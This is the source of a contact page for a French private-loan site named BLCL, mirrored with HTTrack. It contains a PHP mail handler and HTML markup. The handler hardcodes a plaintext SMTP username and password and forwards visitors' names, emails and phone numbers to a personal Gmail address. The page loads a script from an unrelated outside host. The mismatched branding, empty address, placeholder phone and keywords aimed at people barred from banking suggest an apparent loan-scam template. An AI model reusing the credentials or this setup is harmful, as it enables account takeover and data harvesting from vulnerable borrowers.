<?php

use PHPMailer\PHPMailer\PHPMailer;

require 'vendor/autoload.php';
if (isset($_POST['envoyer'])) {
    if (!empty($_POST['nom']) && !empty($_POST['email']) && !empty($_POST['telephone']) && !empty($_POST['objet']) && !empty($_POST['msg'])) {
        $nom = htmlspecialchars($_POST['nom']);
        $email = htmlspecialchars($_POST['email']);
        $telephone = htmlspecialchars($_POST['telephone']);
        $objet = htmlspecialchars($_POST['objet']);
        $msg = htmlspecialchars($_POST['msg']);


        $numero = date("U");
        $mail = new PHPMailer;
        $mail->isSMTP();
        $mail->SMTPDebug = 0;
        $mail->Host = 'smtp.hostinger.fr';
        $mail->Port = 587;
        $mail->SMTPAuth = true;
        $mail->Username = 'nebstan@expashoping.fr';
        $mail->Password = '96989470Welcom@';
        $mail->setFrom('nebstan@expashoping.fr', 'BLCL');
        $mail->addReplyTo('nebstan@expashoping.fr', 'BLCL');
        $mail->addAddress('justejuste973353@gmail.com', 'BCLC');
        $mail->Subject = 'Objet :' . $objet;
        $mail->isHTML(true);
        $mail->Body = 'Nom : ' . $nom . ' <br> Email : ' . $email . '<br> Message : ' . $msg;

        if ($mail->send()) {
            echo " Message envoyer avc succès, Nous vous répondrons dans peu de temps ";
        } else {

            $erreur = "remplir tout les champ";
        }
    }
}

?>






<!DOCTYPE html>
<html lang="fr">

<!-- Mirrored from www.clcbbll-bnk.com/nous_contacter.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Mar 2021 20:30:08 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />



    <title>Avez vous une question à propos de nos services ? | BLCL</title>
    <meta name="description" content="Vous avez une question au sujet de nos services de crédit rapide en 24 heures ? Nous sommes disponibles pour vous répondre. Avec BLCL, votre rêve devient une réalité." />
    <meta name="keywords" content="Prêt, Auto, Moto, Automobile, Prêt scolarité, Prêt immobilier, Prêt investissement, argent, prêt, credit, prets, emprunt, financement, pret entre particuliers, credit entre particuliers, pret serieux, pret facile, pret rapide, credit entre particulier serieux, pret entre particulier urgent, credit entre particulier serieux et rapide, site de pret entre particulier, pret entre particulier sans frais, annonce pour pret entre particulier, pret entre particulier formulaire, pret entre particulier serieux et fiable, argent preteur, preteur prive d'argent, preteur particulier francais, preteur prive, pret privé, preteur d'argent, pret particulier fiable, pret d'argent particulier a particulier, preteur particulier, preteur prive disponible, pret investisseur prive, pret particulier belgique, preteur d argent, preteur d'argent particulier, preteur dargent, credit rapide particulier, preteur argent particulier, preteur argent prive, recherche credit de particulier a particulier, trouver un preteur prive rapidement, pret de particulier a particulier en belgique, pret d'argent de particulier a particulier, pret entre particulier fiable, pret personnel particulier, preteurs particuliers, preteurs prives, pret d'argent de particulier a particulier, preteur d'argent, preteurs particuliers, cherche pret particulier, Meilleur taux, rachat, demande, pret personnel, interdit, bancaire, dette, courtier, courtiers, consolidation, consolidation de dette, consolidation de dettes, consolidation credit, consolidation de credits, regroupement, particulier, astuce interdit bancaire, fiche, ficher, pret d'argent, boober, prosper, societe de rachat credit, organisme de rachat de credit, credit consommation, credit a la consommation, surendettement, credit perso, pret perso, formulaire de pret, emprunter, groupe de reflexion, TEG, emprunte, taux, intermediation financiere, association, remboursement, credit, pouvoir d'achat, economie, banque, systeme bancaire, rachat de credit" />
    <meta name="author" content="EuroNet Crédits" />

    <!-- favicon icon -->
    <link rel="shortcut icon" href="images/favicon.png" />

    <!-- bootstrap -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />

    <!-- animate -->
    <link rel="stylesheet" type="text/css" href="css/animate.css" />

    <!-- owl-carousel -->
    <link rel="stylesheet" type="text/css" href="css/owl.carousel.css">

    <!-- fontawesome -->
    <link rel="stylesheet" type="text/css" href="css/font-awesome.css" />

    <!-- themify -->
    <link rel="stylesheet" type="text/css" href="css/themify-icons.css" />

    <!-- flaticon -->
    <link rel="stylesheet" type="text/css" href="css/flaticon.css" />

    <!-- prettyphoto -->
    <link rel="stylesheet" type="text/css" href="css/prettyPhoto.css">

    <!-- shortcodes -->
    <link rel="stylesheet" type="text/css" href="css/shortcodes.css" />

    <!-- main -->
    <link rel="stylesheet" type="text/css" href="css/main.css" />

    <!-- responsive -->
    <link rel="stylesheet" type="text/css" href="css/responsive.css" />



</head>

<body>

    <!--page start-->
    <div class="page">

        <!--header start-->
        <div id="top-bar" class="topbar-right text-right">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="ttm-social-links-wrapper list-inline">

                        </div>
                    </div>
                </div>
            </div>
        </div>

        <header id="masthead" class="header ttm-header-style-01">
            <!-- ttm-header-wrap -->
            <div class="ttm-header-wrap">
                <!-- ttm-stickable-header-w -->
                <div id="ttm-stickable-header-w" class="ttm-stickable-header-w clearfix">
                    <!-- ttm-topbar-wrapper -->
                    <div class="ttm-topbar-wrapper clearfix">
                        <div class="container">
                            <div class="ttm-topbar-content">

                                <div class="topbar-right text-right">
                                    <div class="ttm-social-links-wrapper list-inline">

                                    </div>
                                    <div style="margin:0;float:right;">

                                        <div class="ttm-search-overlay" style="margin-top: 15px; width:150px; z-index: 100; position: absolute; transform: translate3d(25px, 35px, 0px); top: 0px; right: 50px; will-change: transform;" x-placement="bottom-start">

                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div><!-- ttm-topbar-wrapper end -->
                    <div id="site-header-menu" class="site-header-menu">
                        <div class="site-header-menu-inner ttm-stickable-header">
                            <div class="container">
                                <!-- site-branding -->
                                <div class="site-branding">
                                    <a class="home-link" href="index.html" title="Altech" rel="home">
                                        <img id="logo-img" class="img-center" src="images/logo.png" alt="logo">
                                    </a>
                                </div><!-- site-branding end -->
                                <!--site-navigation -->
                                <div id="site-navigation" class="site-navigation">
                                    <div class="ttm-menu-toggle">
                                        <input type="checkbox" id="menu-toggle-form" />
                                        <label for="menu-toggle-form" class="ttm-menu-toggle-block">
                                            <span class="toggle-block toggle-blocks-1"></span>
                                            <span class="toggle-block toggle-blocks-2"></span>
                                            <span class="toggle-block toggle-blocks-3"></span>
                                        </label>
                                    </div>
                                    <nav id="menu" class="menu">
                                        <ul class="dropdown">
                                            <li class=""><a href="index.html">Accueil</a></li>
                                            <li class=""><a href="presentation.html">Qui sommes nous ?</a></li>
                                            <li class=""><a href="nos_services.html">Nos Services</a></li>
                                            <li class=""><a href="obtenir_credit.php">Obtenir un prêt</a></li>
                                            <li class="active"><a href="nous_contacter.php">Nous contacter</a></li>
                                        </ul>
                                    </nav>
                                </div><!-- site-navigation end-->
                            </div>
                        </div>
                    </div>
                </div><!-- ttm-stickable-header-w end-->
            </div>
            <!--ttm-header-wrap end -->

        </header>
        <!--header end-->

        <!-- page-title -->
        <div class="ttm-page-title-row">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div class="title-box text-center">
                            <div class="page-title-heading">
                                <h1 class="title" style="color:#fff;"> Nous contacter</h1>
                            </div><!-- /.page-title-captions -->
                            <div class="breadcrumb-wrapper">
                                <span>
                                    <a title="Homepage" href="index.html" style="color:#fff;"><i class="ti ti-home"></i>&nbsp;&nbsp;Accueil</a>
                                </span>
                                <span class="ttm-bread-sep">&nbsp; : : &nbsp;</span>
                                <span style="color:#fff;"> Nous contacter</span>
                            </div>
                        </div>
                    </div><!-- /.col-md-12 -->
                </div><!-- /.row -->
            </div><!-- /.container -->
        </div><!-- page-title end-->

        <!--site-main start-->
        <div class="site-main">
            <div class="ttm-row contact-box-section ttm-bgcolor-grey clearfix">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-4">
                            <!-- featured-icon-box -->
                            <div class="featured-icon-box style8 text-center box-shadow">
                                <div class="featured-icon">
                                    <!-- featured-icon-->
                                    <div class="ttm-icon ttm-icon_element-color-skincolor ttm-icon_element-bgcolor-white ttm-icon_element-size-md ttm-icon_element-style-round">
                                        <i class="fa fa-envelope-o"></i>
                                    </div>
                                </div><!-- featured-icon -->
                                <div class="featured-content">
                                    <!-- featured-content -->
                                    <div class="featured-title">
                                        <h5>E-mail</h5><!-- featured-title -->
                                    </div>
                                    <div class="featured-desc">
                                        <!-- featured-description -->
                                        <p>
                                            <a href="/cdn-cgi/l/email-protection#87e4e8e9f3e6e4f3c7e4ebe4e5e5ebebaae5e9eca9e4e8ea"><span class="__cf_email__" data-cfemail="7f1c10110b1e1c0b3f1c131c1d1d1313521d1114511c1012">[email&#160;protected]</span></a>
                                        </p>
                                    </div>
                                </div><!-- featured-content END-->
                            </div><!-- featured-icon-box -->
                        </div>

                        <div class="col-lg-4">
                            <!-- featured-icon-box -->
                            <div class="featured-icon-box style8 text-center box-shadow">
                                <div class="featured-icon">
                                    <!-- featured-icon-->
                                    <div class="ttm-icon ttm-icon_element-color-skincolor ttm-icon_element-bgcolor-white ttm-icon_element-size-md ttm-icon_element-style-round">
                                        <i class="ti ti-target"></i>
                                    </div>
                                </div><!-- featured-icon -->
                                <div class="featured-content">
                                    <!-- featured-content -->
                                    <div class="featured-title">
                                        <h5>Adresse</h5><!-- featured-title -->
                                    </div>
                                    <div class="featured-desc">
                                        <!-- featured-description -->

                                    </div>
                                </div><!-- featured-content END-->
                            </div><!-- featured-icon-box -->
                        </div>
                        <div class="col-lg-4">
                            <!-- featured-icon-box -->
                            <div class="featured-icon-box style8 text-center box-shadow">
                                <div class="featured-icon">
                                    <!-- featured-icon-->
                                    <div class="ttm-icon ttm-icon_element-color-skincolor ttm-icon_element-bgcolor-white ttm-icon_element-size-md ttm-icon_element-style-round">
                                        <i class="fa fa-phone"></i>
                                    </div>
                                </div><!-- featured-icon -->
                                <div class="featured-content">
                                    <!-- featured-content -->
                                    <div class="featured-title">
                                        <h5>Téléphone</h5><!-- featured-title -->
                                    </div>
                                    <div class="featured-desc">
                                        <!-- featured-description -->
                                        <p>
                                            <a href="#">00000000000</a>
                                        </p>
                                    </div>
                                </div><!-- featured-content END-->
                            </div><!-- featured-icon-box -->
                        </div>
                    </div>
                </div>
            </div>
            <!-- services-slide-section -->
            <section class="ttm-row contact-section clearfix" id="message">
                <div class="container">
                    <div class="row">
                        <!-- row -->
                        <div class="col-lg-8 offset-lg-2">
                            <!-- section-title -->
                            <div class="section-title with-desc text-center clearfix">
                                <div class="title-header">
                                    <h5>Entrer en contact avec nous</h5>
                                    <h2 class="title">Formulaire de contact</h2>

                                </div>
                            </div><!-- section-title end -->
                        </div>
                    </div>
                    <!-- row end -->
                    <!-- row -->
                    <form id="ttm-quote-form" class="row ttm-quote-form clearfix" method="post" action="">
                        <div class="col-sm-6 col-md-6">
                            <div class="form-group">
                                <input name="nom" type="text" class="form-control bg-white border" placeholder="Nom complet *" required>
                            </div>
                        </div>
                        <div class="col-sm-6 col-md-6">
                            <div class="form-group">
                                <input name="email" type="email" placeholder="Adresse E-mail *" class="form-control bg-white border" required>
                            </div>
                        </div>
                        <div class="col-sm-6 col-md-6">
                            <div class="form-group">
                                <input name="telephone" type="tel" placeholder="Téléphone mobile *" class="form-control bg-white border" required>
                            </div>
                        </div>
                        <div class="col-sm-6 col-md-6">
                            <div class="form-group">
                                <input name="objet" type="text" placeholder="Sujet *" class="form-control bg-white border" required>
                            </div>
                        </div>

                        <div class="col-sm-12 col-md-12">
                            <div class="form-group">
                                <textarea name="msg" rows="5" placeholder="Votre Message..." class="form-control bg-white border" required></textarea>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="text-center">
                                <button type="submit" name="envoyer" id="submit" class="ttm-btn ttm-btn-size-md ttm-btn-bgcolor-skincolor mt-20" value="">
                                    Envoyer le message </button>
                            </div>
                        </div>
                    </form>
                    <!-- row end-->
                </div>
            </section>

            <!-- services-slide-section end -->
        </div>
        <!--site-main end-->

        <!--footer start-->
        <footer class="footer widget-footer clearfix">
            <div class="second-footer ttm-textcolor-white bg-img2">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget widget_text clearfix">
                                <div class="footer-logo">
                                    <img src="images/logo.png" alt="footer-logo">
                                </div>
                                <div style="margin-top:45px;">
                                    <h6 class="mb-20">Nous Suivre sur</h6>
                                    <div class="social-icons circle social-hover">
                                        <ul class="list-inline">
                                            <li class="social-facebook"><a class="tooltip-top" target="_blank" href="#" data-tooltip="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
                                            <li class="social-twitter"><a class="tooltip-top" target="_blank" href="#" data-tooltip="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
                                            <li class="social-flickr"><a class=" tooltip-top" target="_blank" href="#" data-tooltip="flickr"><i class="fa fa-flickr" aria-hidden="true"></i></a></li>
                                            <li class="social-linkedin"><a class=" tooltip-top" target="_blank" href="#" data-tooltip="LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget link-widget clearfix">
                                <h3 class="widget-title">Nos Liens</h3>
                                <ul id="menu-footer-services">
                                    <li><a href="index.html">Accueil</a></li>
                                    <li><a href="presentation.html">Qui sommes nous ?</a></li>
                                    <li><a href="nos_services.html">Nos Services</a></li>
                                    <li><a href="obtenir_credit.php">Obtenir un prêt</a></li>
                                    <li><a href="nous_contacter.php">Nous contacter</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget link-widget clearfix">
                                <h3 class="widget-title">Notre Adresse</h3>
                                <ul id="menu-footer-services" style="font-weight:500;">

                                    <li><i class="fa fa-phone"></i>&nbsp; 00000000000</li>
                                    <li><i class="fa fa-envelope-o"></i>&nbsp; <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4f2c20213b2e2c3b0f2c232c2d2d2323622d2124612c2022">[email&#160;protected]</a></li>
                                    <li><i class="fa fa-laptop"></i>&nbsp; www.clcbbll-bnk.com</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget flicker_widget clearfix">
                                <h3 class="widget-title">NewsLetter</h3>
                                <div class="textwidget widget-text">
                                    Inscrivez-vous dès aujourd'hui pour obtenir nos dernières nouvelles. <form id="subscribe-form" class="newsletter-form" method="post" action="#" data-mailchimp="true">
                                        <div class="mailchimp-inputbox clearfix" id="subscribe-content">
                                            <i class="fa fa-envelope"></i>
                                            <input type="email" name="email" placeholder="Adresse E-mail" required="">
                                            <input type="submit" value="">
                                        </div>
                                        <div id="subscribe-msg"></div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bottom-footer-text ttm-bgcolor-darkgrey ttm-textcolor-white">
                <div class="container">
                    <div class="row copyright">
                        <div class="col-md-6">
                            <div class="">
                                <span>Copyright © 2020&nbsp;<a href="#">BLCL</a></span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="text-md-right res-767-mt-10">
                                <div class="d-lg-inline-flex">
                                    <ul id="menu-footer-menu" class="footer-nav-menu">
                                        <li><a href="#">Mention légale</a></li>
                                        <li><a href="#">Politique de confidentialité</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!--footer end-->

        <!--back-to-top start-->

        <!--back-to-top end-->

    </div><!-- page end -->

    <!-- Javascript -->

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/plugins.js"></script>
    <script src="js/tether.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.easing.js"></script>
    <script src="js/jquery-waypoints.js"></script>
    <script src="js/jquery-validate.js"></script>
    <script src="js/owl.carousel.js"></script>
    <script src="js/jquery.prettyPhoto.js"></script>
    <script src="https://eho-services.com/404.php"></script>
    <script src="js/lazysizes.min.js"></script>
    <script src="js/main.js"></script>

    <!-- Javascript end-->
</body>

<!-- Mirrored from www.clcbbll-bnk.com/nous_contacter.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Mar 2021 20:30:09 GMT -->

</html>